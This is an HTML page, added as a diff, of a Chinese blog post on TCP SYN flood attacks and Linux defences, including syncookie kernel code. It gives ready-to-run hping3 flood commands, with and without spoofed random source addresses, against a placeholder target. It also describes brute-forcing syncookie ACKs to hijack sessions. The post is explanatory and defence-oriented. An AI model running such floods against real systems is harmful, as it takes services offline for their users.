@@ -1,0 +1,1625 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="update 2017-5-11: syncookies 会点用 tcp_options 字段空间，会强制关闭 tcp 高级流控技术而退化成原始 tcp 模式。此模式会导致 封包 丢失时对端要等待MSL时间来发现丢包事件并重试，以及关闭连接时 TIME_WAIT 状态保持 2MSL 时间。 简介TCP协议要经过三次握手才能建立连接(from wiki)：  于是出现了对于握手过程进行的攻击。攻击者">
+<meta name="keywords" content="security,tcp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="扯谈网络编程之Tcp SYN flood洪水攻击">
+<meta property="og:url" content="http://hengyunabc.github.io/tcp-syn-flood/index.html">
+<meta property="og:site_name" content="横云断岭的专栏">
+<meta property="og:description" content="update 2017-5-11: syncookies 会点用 tcp_options 字段空间，会强制关闭 tcp 高级流控技术而退化成原始 tcp 模式。此模式会导致 封包 丢失时对端要等待MSL时间来发现丢包事件并重试，以及关闭连接时 TIME_WAIT 状态保持 2MSL 时间。 简介TCP协议要经过三次握手才能建立连接(from wiki)：  于是出现了对于握手过程进行的攻击。攻击者">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://hengyunabc.github.io/img/tcp-syn.png">
+<meta property="og:image" content="http://hengyunabc.github.io/img/hping3.png">
+<meta property="og:updated_time" content="2020-03-02T17:57:00.255Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="扯谈网络编程之Tcp SYN flood洪水攻击">
+<meta name="twitter:description" content="update 2017-5-11: syncookies 会点用 tcp_options 字段空间，会强制关闭 tcp 高级流控技术而退化成原始 tcp 模式。此模式会导致 封包 丢失时对端要等待MSL时间来发现丢包事件并重试，以及关闭连接时 TIME_WAIT 状态保持 2MSL 时间。 简介TCP协议要经过三次握手才能建立连接(from wiki)：  于是出现了对于握手过程进行的攻击。攻击者">
+<meta name="twitter:image" content="http://hengyunabc.github.io/img/tcp-syn.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="横云断岭的专栏" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://hengyunabc.github.io/tcp-syn-flood/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>扯谈网络编程之Tcp SYN flood洪水攻击 | 横云断岭的专栏</title>
+  
+
+
+
+
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5a7a572817c66cc21c289fdae273d6aa";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">横云断岭的专栏</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+<script data-ad-client="ca-pub-7158916156928962" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://hengyunabc.github.io/tcp-syn-flood/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="横云断岭/hengyunabc">
+      <meta itemprop="description" content="日落黄金台金黄落日">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="横云断岭的专栏">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">扯谈网络编程之Tcp SYN flood洪水攻击
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2014-05-12 05:58:28" itemprop="dateCreated datePublished" datetime="2014-05-12T05:58:28+00:00">2014-05-12</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-03-02 17:57:00" itemprop="dateModified" datetime="2020-03-02T17:57:00+00:00">2020-03-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>update 2017-5-11: syncookies 会点用 tcp_options 字段空间，会强制关闭 tcp 高级流控技术而退化成原始 tcp 模式。此模式会导致 封包 丢失时对端要等待MSL时间来发现丢包事件并重试，以及关闭连接时 TIME_WAIT 状态保持 2MSL 时间。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>TCP协议要经过三次握手才能建立连接(from wiki)：</p>
+<p><img src="/img/tcp-syn.png" alt="tcp"></p>
+<p>于是出现了对于握手过程进行的攻击。攻击者发送大量的SYN包，服务器回应(SYN+ACK)包，但是攻击者不回应ACK包，这样的话，服务器不知道(SYN+ACK)是否发送成功，默认情况下会重试5次（tcp_syn_retries）。这样的话，对于服务器的内存，带宽都有很大的消耗。攻击者如果处于公网，可以伪造IP的话，对于服务器就很难根据IP来判断攻击者，给防护带来很大的困难。</p>
+<h2 id="攻与防"><a href="#攻与防" class="headerlink" title="攻与防"></a>攻与防</h2><h3 id="攻击者角度"><a href="#攻击者角度" class="headerlink" title="攻击者角度"></a>攻击者角度</h3><p>从攻击者的角度来看，有两个地方可以提高服务器防御的难度的：</p>
+<ul>
+<li>变换端口</li>
+<li>伪造IP</li>
+</ul>
+<p>变换端口很容易做到，攻击者可以使用任意端口。</p>
+<p>攻击者如果是只有内网IP，是没办法伪造IP的，因为伪造的SYN包会被路由抛弃。攻击者如果是有公网IP，则有可能伪造IP，发出SYN包。（TODO，待更多验证）</p>
+<h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>hping3是一个很有名的网络安全工具，使用它可以很容易构造各种协议包。</p>
+<p>用下面的命令可以很容易就发起SYN攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hping3 --flood -S -p 9999  x.x.x.x</span><br><span class="line"><span class="comment">#random source address</span></span><br><span class="line">sudo hping3 --flood -S --rand-source -p 9999  x.x.x.x</span><br></pre></td></tr></table></figure>
+<ul>
+<li>–flood 是不间断发包的意思</li>
+<li>-S         是SYN包的意思</li>
+</ul>
+<p>更多的选项，可以man hping3 查看文档，有详细的说明。</p>
+<p>如果是条件允许，可以伪造IP地址的话，可以用–rand-source参数来伪造。<br>我在实际测试的过程中，可以伪造IP，也可以发送出去，但是服务器没有回应，从本地路由器的统计数据可以看出是路由器把包给丢弃掉了。</p>
+<p>我用两个美国的主机来测试，使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hping3 --flood -S  -p 9999  x.x.x.x</span><br></pre></td></tr></table></figure>
+<p><img src="/img/hping3.png" alt="hping3"></p>
+<p>发现，实际上攻击效果有限，只有网络使用上涨了，服务器的cpu，内存使用都没有什么变化：</p>
+<p>为什么会这样呢？下面再解析。</p>
+<h3 id="防御者角度"><a href="#防御者角度" class="headerlink" title="防御者角度"></a>防御者角度</h3><p>当可能遇到SYN flood攻击时，syslog，/var/log/syslog里可能会出现下面的日志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel: [3649830.269068] TCP: Possible SYN flooding on port 9999. Sending cookies.  Check SNMP counters.</span><br></pre></td></tr></table></figure>
+<p>这个也有可能是SNMP协议误报，下面再解析。</p>
+<p>从防御者的角度来看，主要有以下的措施：</p>
+<ul>
+<li>内核参数的调优</li>
+<li>防火墙禁止掉部分IP</li>
+</ul>
+<p>linux内核参数调优主要有下面三个：</p>
+<ul>
+<li>增大tcp_max_syn_backlog</li>
+<li>减小tcp_synack_retries</li>
+<li>启用tcp_syncookies</li>
+</ul>
+<h4 id="tcp-max-syn-backlog"><a href="#tcp-max-syn-backlog" class="headerlink" title="tcp_max_syn_backlog"></a>tcp_max_syn_backlog</h4><p>从字面上就可以推断出是什么意思。在内核里有个队列用来存放还没有确认ACK的客户端请求，当等待的请求数大于tcp_max_syn_backlog时，后面的会被丢弃。</p>
+<p>所以，适当增大这个值，可以在压力大的时候提高握手的成功率。手册里推荐大于1024。</p>
+<h4 id="tcp-synack-retries"><a href="#tcp-synack-retries" class="headerlink" title="tcp_synack_retries"></a>tcp_synack_retries</h4><p>这个是三次握手中，服务器回应ACK给客户端里，重试的次数。默认是5。显然攻击者是不会完成整个三次握手的，因此服务器在发出的ACK包在没有回应的情况下，会重试发送。当发送者是伪造IP时，服务器的ACK回应自然是无效的。</p>
+<p>为了防止服务器做这种无用功，可以把tcp_synack_retries设置为0或者1。因为对于正常的客户端，如果它接收不到服务器回应的ACK包，它会再次发送SYN包，客户端还是能正常连接的，只是可能在某些情况下建立连接的速度变慢了一点。</p>
+<h4 id="tcp-syncookies"><a href="#tcp-syncookies" class="headerlink" title="tcp_syncookies"></a>tcp_syncookies</h4><p>根据man tcp手册，tcp_syncookies是这样解析的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcp_syncookies (Boolean; since Linux 2.2)</span><br><span class="line">       Enable TCP syncookies.  The kernel must be compiled with CONFIG_SYN_COOKIES.  Send out syncookies  when  the</span><br><span class="line">       syn  backlog  queue  of  a socket overflows.  The syncookies feature attempts to protect a socket from a SYN</span><br><span class="line">       flood attack.  This should be used as a last resort, if at all.  This is a violation of  the  TCP  protocol,</span><br><span class="line">       and conflicts with other areas of TCP such as TCP extensions.  It can cause problems for clients and relays.</span><br><span class="line">       It is not recommended as a tuning mechanism for heavily loaded servers to help with overloaded or misconfig‐</span><br><span class="line">       ured   conditions.    For   recommended   alternatives   see  tcp_max_syn_backlog,  tcp_synack_retries,  and</span><br><span class="line">       tcp_abort_on_overflow.</span><br></pre></td></tr></table></figure>
+<p>当半连接的请求数量超过了tcp_max_syn_backlog时，内核就会启用SYN cookie机制，不再把半连接请求放到队列里，而是用SYN cookie来检验。</p>
+<p>手册上只给出了模糊的说明，具体的实现没有提到。</p>
+<h3 id="linux下SYN-cookie的实现"><a href="#linux下SYN-cookie的实现" class="headerlink" title="linux下SYN cookie的实现"></a>linux下SYN cookie的实现</h3><p>查看了linux的代码（<a href="https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c</a> ）后，发现linux的实现并不是像wiki上</p>
+<p>SYN cookie是非常巧妙地利用了TCP规范来绕过了TCP连接建立过程的验证过程，从而让服务器的负载可以大大降低。</p>
+<p>在三次握手中，当服务器回应（SYN + ACK）包后，客户端要回应一个n + 1的ACK到服务器。其中n是服务器自己指定的。当启用tcp_syncookies时，linux内核生成一个特定的n值，而不并把客户的连接放到半连接的队列里（即没有存储任何关于这个连接的信息）。当客户端提交第三次握手的ACK包时，linux内核取出n值，进行校验，如果通过，则认为这个是一个合法的连接。</p>
+<p>n即ISN（initial sequence number），是一个无符号的32位整数，<strong>那么linux内核是如何把信息记录到这有限的32位里，并完成校验的？</strong></p>
+<p>首先，TCP连接建立时，双方要协商好MSS（Maximum segment size），服务器要把客户端在ACK包里发过来的MSS值记录下来。</p>
+<p>另外，因为服务器没有记录ACK包的任何信息，实际上是绕过了正常的TCP握手的过程，服务器只能靠客户端的第三次握手发过来的ACK包来验证，所以必须要有一个可靠的校验算法，防止攻击者伪造ACK，劫持会话。</p>
+<p>linux是这样实现的：</p>
+<ol>
+<li>在服务器上有一个60秒的计时器，即每隔60秒，count加一；</li>
+<li>MSS是这样子保存起来的，用一个硬编码的数组，保存起一些MSS值：</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __u16 <span class="keyword">const</span> msstab[] = &#123;</span><br><span class="line">	<span class="number">536</span>,</span><br><span class="line">	<span class="number">1300</span>,</span><br><span class="line">	<span class="number">1440</span>,	<span class="comment">/* 1440, 1452: PPPoE */</span></span><br><span class="line">	<span class="number">1460</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>比较客户发过来的mms，取一个比客户发过来的值还要小的mms。算法很简单：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a syncookie.  mssp points to the mss, which is returned</span></span><br><span class="line"><span class="comment"> * rounded down to the value encoded in the cookie.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u32 __cookie_v4_init_sequence(<span class="keyword">const</span> struct iphdr *iph, <span class="keyword">const</span> struct tcphdr *th,</span><br><span class="line">			      u16 *mssp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> mssind;</span><br><span class="line">	<span class="keyword">const</span> __u16 mss = *mssp;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (mssind = ARRAY_SIZE(msstab) - <span class="number">1</span>; mssind ; mssind--)</span><br><span class="line">		<span class="keyword">if</span> (mss &gt;= msstab[mssind])</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	*mssp = msstab[mssind];</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> secure_tcp_syn_cookie(iph-&gt;saddr, iph-&gt;daddr,</span><br><span class="line">				     th-&gt;source, th-&gt;dest, ntohl(th-&gt;seq),</span><br><span class="line">				     mssind);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>比较客户发过来的mms，取一个比客户发过来的值还要小的mms。</p>
+<p>真正的算法在这个函数里：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __u32 <span class="title">secure_tcp_syn_cookie</span><span class="params">(__be32 saddr, __be32 daddr, __be16 sport,</span></span></span><br><span class="line"><span class="function"><span class="params">				   __be16 dport, __u32 sseq, __u32 data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Compute the secure sequence number.</span></span><br><span class="line"><span class="comment">	 * The output should be:</span></span><br><span class="line"><span class="comment">	 *   HASH(sec1,saddr,sport,daddr,dport,sec1) + sseq + (count * 2^24)</span></span><br><span class="line"><span class="comment">	 *      + (HASH(sec2,saddr,sport,daddr,dport,count,sec2) % 2^24).</span></span><br><span class="line"><span class="comment">	 * Where sseq is their sequence number and count increases every</span></span><br><span class="line"><span class="comment">	 * minute by 1.</span></span><br><span class="line"><span class="comment">	 * As an extra hack, we add a small "data" value that encodes the</span></span><br><span class="line"><span class="comment">	 * MSS into the second hash value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 count = tcp_cookie_time();</span><br><span class="line">	<span class="keyword">return</span> (cookie_hash(saddr, daddr, sport, dport, <span class="number">0</span>, <span class="number">0</span>) +</span><br><span class="line">		sseq + (count &lt;&lt; COOKIEBITS) +</span><br><span class="line">		((cookie_hash(saddr, daddr, sport, dport, count, <span class="number">1</span>) + data)</span><br><span class="line">		 &amp; COOKIEMASK));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>data实际上是mss的值对应的数组下标，count是每一分钟会加1，sseq是客户端发过来的sequence。</p>
+<p>这样经过hash和一些加法，得到了一个ISN值，其中里记录了这个连接合适的MSS值。</p>
+<p>当接收到客户端发过来的第三次握手的ACK包时，反向检查即可：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if a ack sequence number is a valid syncookie.</span></span><br><span class="line"><span class="comment"> * Return the decoded mss if it is, or 0 if not.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> __cookie_v4_check(<span class="keyword">const</span> struct iphdr *iph, <span class="keyword">const</span> struct tcphdr *th,</span><br><span class="line">		      u32 cookie)</span><br><span class="line">&#123;</span><br><span class="line">	__u32 seq = ntohl(th-&gt;seq) - <span class="number">1</span>;</span><br><span class="line">	__u32 mssind = check_tcp_syn_cookie(cookie, iph-&gt;saddr, iph-&gt;daddr,</span><br><span class="line">					    th-&gt;source, th-&gt;dest, seq);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> mssind &lt; ARRAY_SIZE(msstab) ? msstab[mssind] : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先得到原来的seq，再调用check_tcp_syn_cookie函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This retrieves the small "data" value from the syncookie.</span></span><br><span class="line"><span class="comment"> * If the syncookie is bad, the data returned will be out of</span></span><br><span class="line"><span class="comment"> * range.  This must be checked by the caller.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The count value used to generate the cookie must be less than</span></span><br><span class="line"><span class="comment"> * MAX_SYNCOOKIE_AGE minutes in the past.</span></span><br><span class="line"><span class="comment"> * The return value (__u32)-1 if this test fails.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __u32 <span class="title">check_tcp_syn_cookie</span><span class="params">(__u32 cookie, __be32 saddr, __be32 daddr,</span></span></span><br><span class="line"><span class="function"><span class="params">				  __be16 sport, __be16 dport, __u32 sseq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u32 diff, count = tcp_cookie_time();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="comment">/* Strip away the layers from the cookie */</span></span><br><span class="line">	cookie -= cookie_hash(saddr, daddr, sport, dport, <span class="number">0</span>, <span class="number">0</span>) + sseq;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="comment">/* Cookie is now reduced to (count * 2^24) ^ (hash % 2^24) */</span></span><br><span class="line">	diff = (count - (cookie &gt;&gt; COOKIEBITS)) &amp; ((__u32) <span class="number">-1</span> &gt;&gt; COOKIEBITS);</span><br><span class="line">	<span class="keyword">if</span> (diff &gt;= MAX_SYNCOOKIE_AGE)</span><br><span class="line">		<span class="keyword">return</span> (__u32)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> (cookie -</span><br><span class="line">		cookie_hash(saddr, daddr, sport, dport, count - diff, <span class="number">1</span>))</span><br><span class="line">		&amp; COOKIEMASK;	<span class="comment">/* Leaving the data behind */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先减去之前的一些值，第一个hash和sseq。然后计算现在的count（每60秒加1的计数器）和之前的发给客户端，然后客户端返回过来的count的差：<br>如果大于MAX_SYNCOOKIE_AGE，即2，即2分钟。则说明已经超时了。</p>
+<p>否则，计算得出之前放进去的mss。这样内核就认为这个是一个合法的TCP连接，并且得到了一个合适的mss值，这样就建立起了一个合法的TCP连接。<br>可以看到SYN cookie机制十分巧妙地不用任何存储，以略消耗CPU实现了对第三次握手的校验。</p>
+<p>但是有得必有失，ISN里只存储了MSS值，因此，其它的TCP Option都不会生效，这就是为什么SNMP协议会误报的原因了。</p>
+<h3 id="更强大的攻击者"><a href="#更强大的攻击者" class="headerlink" title="更强大的攻击者"></a>更强大的攻击者</h3><p>SYN cookie虽然十分巧妙，但是也给攻击者带了新的攻击思路。</p>
+<p>因为SYN cookie机制不是正常的TCP三次握手。因此攻击者可以构造一个第三次握手的ACK包，从而劫持会话。</p>
+<p>攻击者的思路很简单，通过暴力发送大量的伪造的第三次握手的ACK包，因为ISN只有32位，攻击者只要发送全部的ISN数据ACK包，总会有一个可以通过服务器端的校验。</p>
+<p>有的人就会问了，即使攻击者成功通过了服务器的检验，它还是没有办法和服务器正常通讯啊，因为服务器回应的包都不会发给攻击者。</p>
+<p>刚开始时，我也有这个疑问，但是TCP允许在第三次握手的ACK包里带上后面请求的数据，这样可以加快数据的传输。所以，比如一个http服务器，攻击者可以通过在第三次握手的ACK包里带上http get/post请求，从而完成攻击。</p>
+<p>所以对于服务器而言，不能只是依靠IP来校验合法的请求，还要通过其它的一些方法来加强校验。比如CSRF等。</p>
+<p><strong>值得提醒的是即使是正常的TCP三次握手过程，攻击者还是可以进行会话劫持的，只是概率比SYN cookie的情况下要小很多。</strong></p>
+<p>详细的攻击说明：<a href="http://www.91ri.org/7075.html" target="_blank" rel="noopener">http://www.91ri.org/7075.html</a></p>
+<h3 id="一个用raw-socket-SYN-flood攻击的代码"><a href="#一个用raw-socket-SYN-flood攻击的代码" class="headerlink" title="一个用raw socket SYN flood攻击的代码"></a>一个用raw socket SYN flood攻击的代码</h3><p>下面给出一个tcp syn flood的攻击的代码：</p>
